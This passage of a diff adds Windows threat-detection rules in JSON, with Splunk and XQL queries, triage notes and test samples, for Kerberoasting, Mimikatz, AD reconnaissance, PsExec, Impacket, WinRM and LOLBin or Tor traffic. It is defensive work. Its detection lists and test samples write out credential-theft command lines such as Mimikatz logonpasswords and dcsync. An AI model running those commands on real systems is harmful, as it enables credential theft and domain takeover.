+      "process.command_line": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0018",
+   "title": "Kerberoasting or AS-REP roasting tool run",
+   "description": "Command lines of Rubeus, PowerView, Invoke-Kerberoast or Impacket GetUserSPNs / GetNPUsers requesting service tickets or AS-REPs to crack offline. Any domain user can do this, so it is one of the first steps after an initial foothold in AD.",
+   "attack": [
+    "T1558.003",
+    "T1558.004"
+   ],
+   "tactic": "credential-access",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "kerberoast",
+       "asreproast",
+       "get-domainspnticket",
+       "request-spnticket",
+       "getuserspns",
+       "getnpusers",
+       "/format:hashcat"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Pair it with Windows event 4769 on the DCs (many TGS requests with RC4, 0x17) from the same account.",
+    "Rotate the passwords of the targeted service accounts and move them to long random passwords or gMSA."
+   ],
+   "false_positives": [
+    "Authorised penetration tests and red team exercises."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line contains \"kerberoast\" or action_process_image_command_line contains \"asreproast\" or action_process_image_command_line contains \"get-domainspnticket\" or action_process_image_command_line contains \"request-spnticket\" or action_process_image_command_line contains \"getuserspns\" or action_process_image_command_line contains \"getnpusers\" or action_process_image_command_line contains \"/format:hashcat\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where match(CommandLine, \"(?i)kerberoast\") OR match(CommandLine, \"(?i)asreproast\") OR match(CommandLine, \"(?i)get\\\\-domainspnticket\") OR match(CommandLine, \"(?i)request\\\\-spnticket\") OR match(CommandLine, \"(?i)getuserspns\") OR match(CommandLine, \"(?i)getnpusers\") OR match(CommandLine, \"(?i)/format:hashcat\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "rubeus.exe",
+      "process.command_line": "Rubeus.exe kerberoast /outfile:hashes.txt"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell -c Invoke-Kerberoast -OutputFormat Hashcat"
+     },
+     {
+      "process.name": "python.exe",
+      "process.command_line": "python GetUserSPNs.py corp.local/user:pass -request"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "klist.exe",
+      "process.command_line": "klist tickets"
+     },
+     {
+      "process.name": "setspn.exe",
+      "process.command_line": "setspn -L svc_sql"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0019",
+   "title": "Mimikatz modules on the command line",
+   "description": "Command lines with Mimikatz module syntax (sekurlsa::, lsadump::, kerberos::, token::, dpapi::, privilege::debug), including when the binary is renamed or run through PowerShell (Invoke-Mimikatz).",
+   "attack": [
+    "T1003.001",
+    "T1003.006",
+    "T1550.002",
+    "T1558.001"
+   ],
+   "tactic": "credential-access",
+   "severity": "critical",
+   "logsource": "process_creation",
+   "selections": {
+    "modules": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "sekurlsa::",
+       "lsadump::",
+       "kerberos::",
+       "token::elevate",
+       "dpapi::",
+       "privilege::debug",
+       "crypto::",
+       "invoke-mimikatz"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "modules"
+   },
+   "condition_text": "modules",
+   "triage": [
+    "lsadump::dcsync or lsadump::lsa on a DC means domain compromise. Escalate immediately.",
+    "kerberos::golden or ::ptt means forged or injected tickets. Plan a double krbtgt reset.",
+    "Reset every credential that was on the host."
+   ],
+   "false_positives": [
+    "Authorised red team activity."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line contains \"sekurlsa::\" or action_process_image_command_line contains \"lsadump::\" or action_process_image_command_line contains \"kerberos::\" or action_process_image_command_line contains \"token::elevate\" or action_process_image_command_line contains \"dpapi::\" or action_process_image_command_line contains \"privilege::debug\" or action_process_image_command_line contains \"crypto::\" or action_process_image_command_line contains \"invoke-mimikatz\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where match(CommandLine, \"(?i)sekurlsa::\") OR match(CommandLine, \"(?i)lsadump::\") OR match(CommandLine, \"(?i)kerberos::\") OR match(CommandLine, \"(?i)token::elevate\") OR match(CommandLine, \"(?i)dpapi::\") OR match(CommandLine, \"(?i)privilege::debug\") OR match(CommandLine, \"(?i)crypto::\") OR match(CommandLine, \"(?i)invoke\\\\-mimikatz\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "m.exe",
+      "process.command_line": "m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell IEX(...); Invoke-Mimikatz -Command '\"lsadump::dcsync /user:krbtgt\"'"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "cmd.exe",
+      "process.command_line": "cmd /c echo hello"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0020",
+   "title": "Domain admin groups, domain controllers or trusts enumerated with built-in tools",
+   "description": "net group \"Domain Admins\" /domain, nltest /dclist or /domain_trusts, and AdFind trust dumps. Early AD reconnaissance to find who to target and where the domain borders are.",
+   "attack": [
+    "T1069.002",
+    "T1087.002",
+    "T1482",
+    "T1018"
+   ],
+   "tactic": "discovery",
+   "severity": "medium",
+   "logsource": "process_creation",
+   "selections": {
+    "net_group": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "net.exe",
+       "net1.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "group",
+       "/domain"
+      ]
+     }
+    ],
+    "privileged_group": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "domain admins",
+       "enterprise admins",
+       "schema admins",
+       "domain controllers",
+       "administrators"
+      ]
+     }
+    ],
+    "nltest": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "nltest.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "/domain_trusts",
+       "/dclist",
+       "/all_trusts",
+       "/trusted_domains",
+       "/dsgetdc"
+      ]
+     }
+    ],
+    "adfind": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "adfind",
+       "trustdmp",
+       "objectcategory=computer"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "or": [
+       {
+        "and": [
+         {
+          "sel": "net_group"
+         },
+         {
+          "sel": "privileged_group"
+         }
+        ]
+       },
+       {
+        "sel": "nltest"
+       }
+      ]
+     },
+     {
+      "sel": "adfind"
+     }
+    ]
+   },
+   "condition_text": "(net_group and privileged_group) or nltest or adfind",
+   "triage": [
+    "Is this account an admin, and is this host an admin workstation? If not, look at how the session started.",
+    "Look for other discovery commands from the same session (whoami /all, ipconfig, net view)."
+   ],
+   "false_positives": [
+    "Helpdesk and AD admins checking group membership. Expect these from admin workstations only."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (((action_process_image_name in (\"net.exe\", \"net1.exe\") and (action_process_image_command_line contains \"group\" and action_process_image_command_line contains \"/domain\")) and (action_process_image_command_line contains \"domain admins\" or action_process_image_command_line contains \"enterprise admins\" or action_process_image_command_line contains \"schema admins\" or action_process_image_command_line contains \"domain controllers\" or action_process_image_command_line contains \"administrators\")) or (action_process_image_name = \"nltest.exe\" and (action_process_image_command_line contains \"/domain_trusts\" or action_process_image_command_line contains \"/dclist\" or action_process_image_command_line contains \"/all_trusts\" or action_process_image_command_line contains \"/trusted_domains\" or action_process_image_command_line contains \"/dsgetdc\"))) or (action_process_image_command_line contains \"adfind\" or action_process_image_command_line contains \"trustdmp\" or action_process_image_command_line contains \"objectcategory=computer\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where ((((lower(process_name)=\"net.exe\" OR lower(process_name)=\"net1.exe\") AND (match(CommandLine, \"(?i)group\") AND match(CommandLine, \"(?i)/domain\"))) AND (match(CommandLine, \"(?i)domain\\\\ admins\") OR match(CommandLine, \"(?i)enterprise\\\\ admins\") OR match(CommandLine, \"(?i)schema\\\\ admins\") OR match(CommandLine, \"(?i)domain\\\\ controllers\") OR match(CommandLine, \"(?i)administrators\"))) OR (lower(process_name)=\"nltest.exe\" AND (match(CommandLine, \"(?i)/domain_trusts\") OR match(CommandLine, \"(?i)/dclist\") OR match(CommandLine, \"(?i)/all_trusts\") OR match(CommandLine, \"(?i)/trusted_domains\") OR match(CommandLine, \"(?i)/dsgetdc\")))) OR (match(CommandLine, \"(?i)adfind\") OR match(CommandLine, \"(?i)trustdmp\") OR match(CommandLine, \"(?i)objectcategory=computer\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "net.exe",
+      "process.command_line": "net group \"Domain Admins\" /domain"
+     },
+     {
+      "process.name": "nltest.exe",
+      "process.command_line": "nltest /domain_trusts /all_trusts"
+     },
+     {
+      "process.name": "af.exe",
+      "process.command_line": "af.exe -gcb -sc trustdmp"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "net.exe",
+      "process.command_line": "net use Z: \\\\fs01\\share"
+     },
+     {
+      "process.name": "net.exe",
+      "process.command_line": "net localgroup administrators"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0021",
+   "title": "BloodHound collector (SharpHound) run",
+   "description": "SharpHound or Invoke-BloodHound collects sessions, ACLs, group membership and trusts so an attacker can graph a path to Domain Admin.",
+   "attack": [
+    "T1087.002",
+    "T1069.002",
+    "T1482"
+   ],
+   "tactic": "discovery",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "name": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "sharphound.exe"
+      ]
+     }
+    ],
+    "args": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "sharphound",
+       "invoke-bloodhound",
+       "collectionmethod",
+       "bloodhound.py",
+       "--zipfilename"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "sel": "name"
+     },
+     {
+      "sel": "args"
+     }
+    ]
+   },
+   "condition_text": "name or args",
+   "triage": [
+    "Find the output ZIP (usually in the working directory) and check if it left the host.",
+    "Expect LDAP and SMB session enumeration against many hosts from this machine at the same time."
+   ],
+   "false_positives": [
+    "Authorised AD security assessments, which should be scheduled and known."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"sharphound.exe\" or (action_process_image_command_line contains \"sharphound\" or action_process_image_command_line contains \"invoke-bloodhound\" or action_process_image_command_line contains \"collectionmethod\" or action_process_image_command_line contains \"bloodhound.py\" or action_process_image_command_line contains \"--zipfilename\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"sharphound.exe\" OR (match(CommandLine, \"(?i)sharphound\") OR match(CommandLine, \"(?i)invoke\\\\-bloodhound\") OR match(CommandLine, \"(?i)collectionmethod\") OR match(CommandLine, \"(?i)bloodhound\\\\.py\") OR match(CommandLine, \"(?i)\\\\-\\\\-zipfilename\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "sharphound.exe",
+      "process.command_line": "SharpHound.exe -c All"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Invoke-BloodHound -CollectionMethod All -ZipFileName x.zip"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Get-ADUser -Filter *"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0022",
+   "title": "PsExec service runs a command",
+   "description": "PSEXESVC.exe is the service PsExec installs on the target host. A process under it means someone ran a command remotely on this host over SMB.",
+   "attack": [
+    "T1569.002",
+    "T1021.002"
+   ],
+   "tactic": "lateral-movement",
+   "severity": "medium",
+   "logsource": "process_creation",
+   "selections": {
+    "service": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "psexesvc.exe"
+      ]
+     }
+    ],
+    "child": [
+     {
+      "field": "parent.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "psexesvc.exe"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "sel": "service"
+     },
+     {
+      "sel": "child"
+     }
+    ]
+   },
+   "condition_text": "service or child",
+   "triage": [
+    "Find the source host in the 4624 logon (type 3) and 7045 service install events at the same time.",
+    "Read the child command line."
+   ],
+   "false_positives": [
+    "IT admins who use PsExec for support. Confirm the source host and account."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"psexesvc.exe\" or actor_process_image_name = \"psexesvc.exe\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"psexesvc.exe\" OR lower(parent_name)=\"psexesvc.exe\"\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "parent.name": "psexesvc.exe",
+      "process.name": "cmd.exe",
+      "process.command_line": "cmd.exe"
+     },
+     {
+      "parent.name": "services.exe",
+      "process.name": "PSEXESVC.exe",
+      "process.command_line": "C:\\Windows\\PSEXESVC.exe"
+     }
+    ],
+    "no_match": [
+     {
+      "parent.name": "services.exe",
+      "process.name": "svchost.exe",
+      "process.command_line": "svchost.exe -k netsvcs"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0023",
+   "title": "Impacket wmiexec or smbexec style command",
+   "description": "cmd.exe /Q /c <command> 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp> 2>&1. Impacket's wmiexec and smbexec write command output to the ADMIN$ share this way so they can read it back. The pattern is very specific.",
+   "attack": [
+    "T1047",
+    "T1021.002",
+    "T1569.002"
+   ],
+   "tactic": "lateral-movement",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "cmd.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\\\\\\\127\\.0\\.0\\.1\\\\admin\\$\\\\__\\d"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Parent wmiprvse.exe means wmiexec; parent services.exe means smbexec. Find the source in network logons.",
+    "Read every command in the session; they show what the attacker looked for."
+   ],
+   "false_positives": [
+    "Authorised penetration tests."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"cmd.exe\" and action_process_image_command_line ~= \"(?i)\\\\\\\\\\\\\\\\127\\\\.0\\\\.0\\\\.1\\\\\\\\admin\\\\$\\\\\\\\__\\\\d\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"cmd.exe\" AND match(CommandLine, \"(?i)\\\\\\\\\\\\\\\\127\\\\.0\\\\.0\\\\.1\\\\\\\\admin\\\\$\\\\\\\\__\\\\d\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "parent.name": "wmiprvse.exe",
+      "process.name": "cmd.exe",
+      "process.command_line": "cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1729650000.12 2>&1"
+     }
+    ],
+    "no_match": [
+     {
+      "parent.name": "explorer.exe",
+      "process.name": "cmd.exe",
+      "process.command_line": "cmd.exe /c dir \\\\127.0.0.1\\c$"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0024",
+   "title": "Command started through WinRM remoting",
+   "description": "wsmprovhost.exe is the host process for PowerShell remoting (WinRM). A shell, a LOLBin or a discovery command under it means someone ran it remotely, for example with Enter-PSSession or evil-winrm.",
+   "attack": [
+    "T1021.006"
+   ],
+   "tactic": "lateral-movement",
+   "severity": "medium",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "parent.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "wsmprovhost.exe"
+      ]
+     },
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "cmd.exe",
+       "powershell.exe",
+       "whoami.exe",
+       "net.exe",
+       "net1.exe",
+       "nltest.exe",
+       "rundll32.exe",
+       "regsvr32.exe",
+       "certutil.exe",
+       "reg.exe",
+       "schtasks.exe",
+       "sc.exe"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Find the source IP in Microsoft-Windows-WinRM/Operational and the type 3 logon.",
+    "Check if the account normally administers this host."
+   ],
+   "false_positives": [
+    "Admins and management tools using PowerShell remoting. Baseline the source hosts."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"wsmprovhost.exe\" and action_process_image_name in (\"cmd.exe\", \"powershell.exe\", \"whoami.exe\", \"net.exe\", \"net1.exe\", \"nltest.exe\", \"rundll32.exe\", \"regsvr32.exe\", \"certutil.exe\", \"reg.exe\", \"schtasks.exe\", \"sc.exe\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(parent_name)=\"wsmprovhost.exe\" AND (lower(process_name)=\"cmd.exe\" OR lower(process_name)=\"powershell.exe\" OR lower(process_name)=\"whoami.exe\" OR lower(process_name)=\"net.exe\" OR lower(process_name)=\"net1.exe\" OR lower(process_name)=\"nltest.exe\" OR lower(process_name)=\"rundll32.exe\" OR lower(process_name)=\"regsvr32.exe\" OR lower(process_name)=\"certutil.exe\" OR lower(process_name)=\"reg.exe\" OR lower(process_name)=\"schtasks.exe\" OR lower(process_name)=\"sc.exe\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "parent.name": "wsmprovhost.exe",
+      "process.name": "whoami.exe",
+      "process.command_line": "whoami /all"
+     }
+    ],
+    "no_match": [
+     {
+      "parent.name": "wsmprovhost.exe",
+      "process.name": "conhost.exe",
+      "process.command_line": "conhost.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0025",
+   "title": "Living-off-the-land binary connects to the internet",
+   "description": "certutil, mshta, regsvr32, rundll32, bitsadmin, a script host, msbuild, installutil, cmstp or odbcconf opens a connection to a public IP. These binaries are signed by Microsoft and are used to download or talk to C2 without dropping a new tool.",
+   "attack": [
+    "T1105",
+    "T1218"
+   ],
+   "tactic": "command-and-control",
+   "severity": "medium",
+   "logsource": "network_connection",
+   "selections": {
+    "lolbin": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "certutil.exe",
+       "mshta.exe",
+       "regsvr32.exe",
+       "rundll32.exe",
+       "bitsadmin.exe",
+       "wscript.exe",
+       "cscript.exe",
+       "msbuild.exe",
+       "installutil.exe",
+       "cmstp.exe",
+       "odbcconf.exe",
+       "msxsl.exe",
+       "hh.exe"
+      ]
+     }
+    ],
+    "internal": [
+     {
+      "field": "net.remote_ip",
+      "op": "cidr",
+      "all": false,
+      "values": [
+       "10.0.0.0/8",
+       "172.16.0.0/12",
+       "192.168.0.0/16",
+       "127.0.0.0/8",
+       "169.254.0.0/16",
+       "100.64.0.0/10"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "lolbin"
+     },
+     {
+      "not": {
+       "sel": "internal"
+      }
+     }
+    ]
+   },
+   "condition_text": "lolbin and not internal",
+   "triage": [
+    "Resolve the IP (passive DNS) and check its reputation and hosting.",
+    "Look at the process command line from the matching process start event."
+   ],
+   "false_positives": [
+    "rundll32 hosting legitimate control panel or update components that call vendor clouds.",
+    "Proxy setups where every connection goes to a public proxy IP. Exclude the proxy.",
+    "IPv4 only. In XDR, IPv6 peers are in a separate field and are not covered by this rule."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.NETWORK and action_remote_ip != null\n| filter actor_process_image_name in (\"certutil.exe\", \"mshta.exe\", \"regsvr32.exe\", \"rundll32.exe\", \"bitsadmin.exe\", \"wscript.exe\", \"cscript.exe\", \"msbuild.exe\", \"installutil.exe\", \"cmstp.exe\", \"odbcconf.exe\", \"msxsl.exe\", \"hh.exe\") and not ((action_remote_ip != null and (incidr(action_remote_ip, \"10.0.0.0/8\") or incidr(action_remote_ip, \"172.16.0.0/12\") or incidr(action_remote_ip, \"192.168.0.0/16\") or incidr(action_remote_ip, \"127.0.0.0/8\") or incidr(action_remote_ip, \"169.254.0.0/16\") or incidr(action_remote_ip, \"100.64.0.0/10\"))))\n| fields _time, agent_hostname, actor_process_image_name, actor_process_command_line, action_remote_ip, action_remote_port\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=3\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1))\n| where (lower(process_name)=\"certutil.exe\" OR lower(process_name)=\"mshta.exe\" OR lower(process_name)=\"regsvr32.exe\" OR lower(process_name)=\"rundll32.exe\" OR lower(process_name)=\"bitsadmin.exe\" OR lower(process_name)=\"wscript.exe\" OR lower(process_name)=\"cscript.exe\" OR lower(process_name)=\"msbuild.exe\" OR lower(process_name)=\"installutil.exe\" OR lower(process_name)=\"cmstp.exe\" OR lower(process_name)=\"odbcconf.exe\" OR lower(process_name)=\"msxsl.exe\" OR lower(process_name)=\"hh.exe\") AND NOT ((isnotnull(DestinationIp) AND (cidrmatch(\"10.0.0.0/8\", DestinationIp) OR cidrmatch(\"172.16.0.0/12\", DestinationIp) OR cidrmatch(\"192.168.0.0/16\", DestinationIp) OR cidrmatch(\"127.0.0.0/8\", DestinationIp) OR cidrmatch(\"169.254.0.0/16\", DestinationIp) OR cidrmatch(\"100.64.0.0/10\", DestinationIp))))\n| table _time host Image DestinationIp DestinationPort\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "mshta.exe",
+      "net.remote_ip": "203.0.113.9",
+      "net.remote_port": "443"
+     },
+     {
+      "process.name": "certutil.exe",
+      "net.remote_ip": "198.51.100.7",
+      "net.remote_port": "80"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "certutil.exe",
+      "net.remote_ip": "10.0.0.5",
+      "net.remote_port": "80"
+     },
+     {
+      "process.name": "chrome.exe",
+      "net.remote_ip": "203.0.113.9",
+      "net.remote_port": "443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0026",
+   "title": "Connection to common Tor ports from a non-Tor process",
+   "description": "Outbound connections to 9001, 9030, 9050, 9051 or 9150, the default Tor relay, directory and SOCKS ports, from something that is not the Tor client. Malware uses Tor for C2 and ransomware groups use it for their negotiation and leak sites.",
+   "attack": [
+    "T1090.003"
+   ],
+   "tactic": "command-and-control",
+   "severity": "medium",
+   "logsource": "network_connection",
+   "selections": {
+    "tor_port": [
+     {
+      "field": "net.remote_port",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "9001",
+       "9030",
+       "9050",
+       "9051",
+       "9150"
+      ]
+     }
+    ],
+    "tor_client": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "tor.exe",
+       "firefox.exe"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "tor_port"
+     },
+     {
+      "not": {
+       "sel": "tor_client"
+      }
+     }
+    ]
+   },
+   "condition_text": "tor_port and not tor_client",
+   "triage": [
+    "Check whether the destination IP is a known Tor relay.",
+    "Identify the process and how it got there."
+   ],
+   "false_positives": [
+    "Unrelated services that happen to use these ports. Check the destination."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.NETWORK and action_remote_ip != null\n| filter action_remote_port in (9001, 9030, 9050, 9051, 9150) and not ((actor_process_image_name != null and actor_process_image_name in (\"tor.exe\", \"firefox.exe\")))\n| fields _time, agent_hostname, actor_process_image_name, actor_process_command_line, action_remote_ip, action_remote_port\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=3\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1))\n| where (DestinationPort=9001 OR DestinationPort=9030 OR DestinationPort=9050 OR DestinationPort=9051 OR DestinationPort=9150) AND NOT ((isnotnull(process_name) AND (lower(process_name)=\"tor.exe\" OR lower(process_name)=\"firefox.exe\")))\n| table _time host Image DestinationIp DestinationPort\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "svchost32.exe",
+      "net.remote_ip": "203.0.113.9",
+      "net.remote_port": "9001"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "tor.exe",
+      "net.remote_ip": "203.0.113.9",
+      "net.remote_port": "9001"
+     },
+     {
+      "process.name": "updater.exe",
+      "net.remote_ip": "203.0.113.9",
+      "net.remote_port": "443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0027",
+   "title": "Script host or LOLBin looks up a paste site, file drop or tunnel service",
+   "description": "PowerShell, a script host or a LOLBin resolves pastebin, raw GitHub content, a temporary file host, an ngrok or Cloudflare tunnel, Discord CDN or the Telegram bot API. These free services host payloads and act as C2 because they are rarely blocked.",
+   "attack": [
+    "T1102",
+    "T1105",
+    "T1572"
+   ],
+   "tactic": "command-and-control",
+   "severity": "medium",
+   "logsource": "dns_query",
+   "selections": {
+    "process": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "powershell.exe",
+       "pwsh.exe",
+       "wscript.exe",
+       "cscript.exe",
+       "mshta.exe",
+       "rundll32.exe",
+       "regsvr32.exe",
+       "certutil.exe",
+       "bitsadmin.exe",
+       "cmd.exe",
+       "msbuild.exe"
+      ]
+     }
+    ],
+    "service": [
+     {
+      "field": "dns.query",
+      "op": "re",
+      "all": false,
+      "values": [
+       "(^|\\.)(pastebin\\.com|paste\\.ee|hastebin\\.com|rentry\\.co|raw\\.githubusercontent\\.com|transfer\\.sh|file\\.io|gofile\\.io|temp\\.sh|ngrok\\.io|ngrok-free\\.app|trycloudflare\\.com|cdn\\.discordapp\\.com|api\\.telegram\\.org)\\.?$"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "process"
+     },
+     {
+      "sel": "service"
+     }
+    ]
+   },
+   "condition_text": "process and service",
+   "triage": [
+    "Find the URL in proxy logs or the process command line and fetch the content safely.",
+    "Check what the process did after the lookup (new files, child processes)."
+   ],
+   "false_positives": [
+    "Admin or developer scripts that pull from raw.githubusercontent.com. Allowlist by script and repo."
+   ],
